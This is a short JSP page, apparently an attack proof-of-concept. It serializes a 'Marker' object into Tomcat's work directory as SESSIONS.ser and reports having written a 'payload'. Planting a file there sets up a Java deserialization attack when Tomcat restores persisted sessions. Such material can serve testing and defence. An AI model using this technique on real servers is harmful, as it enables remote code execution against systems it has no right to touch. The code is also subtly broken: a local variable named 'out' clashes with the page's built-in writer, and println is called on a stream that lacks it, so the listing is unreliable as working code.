<%@ page import="java.io.*, Marker" %>
<%
try {
  String path = application.getRealPath("/")       // /opt/tomcat/webapps/myapp/
               .replace("webapps", "work/Catalina/localhost")
               + "SESSIONS.ser";
  File f = new File(path);
  f.getParentFile().mkdirs();
  ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
  out.writeObject(new Marker());
  out.close();
  out.println("Wrote payload to: " + path);
} catch (Exception e) {
  out.println("Error: " + e);
}
%>
